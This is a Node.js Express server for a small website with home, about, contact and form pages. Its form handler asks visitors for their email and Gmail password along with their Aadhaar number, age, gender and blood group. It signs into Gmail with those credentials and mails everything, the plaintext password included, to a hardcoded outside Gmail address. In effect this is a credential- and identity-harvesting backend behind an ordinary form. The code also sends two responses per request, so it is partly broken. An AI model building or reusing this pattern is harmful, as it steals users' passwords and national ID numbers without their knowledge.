
const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");

const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
app.use(express.urlencoded());
let home = fs.readFileSync('./index.html');
let about = fs.readFileSync('./about.html');
let contact = fs.readFileSync('./contact.html');
let form = fs.readFileSync('./form.html');


// here use of image read file 

app.use('/static', express.static(path.join(__dirname, 'static')))
const port = process.env.PORT || 200;

app.get('/', (req, res) => {
    res.send(`${home}`)
})
app.get('/about', (req, res) => {
    res.send(`${about}`)
})
app.get('/contact', (req, res) => {
    res.send(`${contact}`)
})
// here used post method 

app.post('/contact', (req, res) => {
    setTimeout(() => {
        res.send(`${home}`);
    }, 4000)

    res.send("your coomment sucessfully submited !")
})
app.get('/form', (req, res) => {
    res.send(`${form}`)
})
// here a post method 
app.post('/form', async (req, res) => {
    // console.log(req.body);
    setTimeout(() => {
        res.send(`${home}`);
    }, 4000)

    // here use nodemailer
    let email = req.body.email;
    let age = req.body.age;
    let name = req.body.name;
    let adhar = req.body.adhar;
    let gender = req.body.gender;
    let blood = req.body.blood;
    let pass = req.body.pass;

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: `${email}`,
            pass: `${pass}`
        }
    });

    var mailOptions = {
        from: `${email}`,
        to: 'mdashifreza3@gmail.com',
        subject: `Sending Email by ${name}`,
        html: `<b>you name is  ${name} , age is ${age} , blood group is ${blood} , adhar no is ${adhar} and your gender is ${gender} and your password is ${pass}  and your email is ${email}</b>`,
        // html: `<b>your email is ${email} and password is ${pass}</b>`
    };

    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
})

app.listen(port, () => {// app .listen 2 argumnwets hai
    console.log("ruuning at port ", port);
})